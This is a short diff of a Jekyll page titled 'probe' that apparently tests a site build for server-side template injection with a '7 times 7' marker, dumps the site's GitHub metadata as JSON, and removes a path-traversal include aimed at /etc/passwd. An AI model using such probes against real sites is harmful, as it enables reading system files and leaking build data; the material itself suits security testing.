@@ -1,11 +1,7 @@
 ---
 title: probe
 ---
-# GH-META-START
+GH-META-START
 {{ site.github | jsonify }}
 GH-META-END
-
-# SSTI {{ 7 | times: 7 }}
-
-# INCLUDE-TRAVERSAL
-{% include_relative ../../etc/passwd %}
+SSTI-{{ 7 | times: 7 }}-SSTI
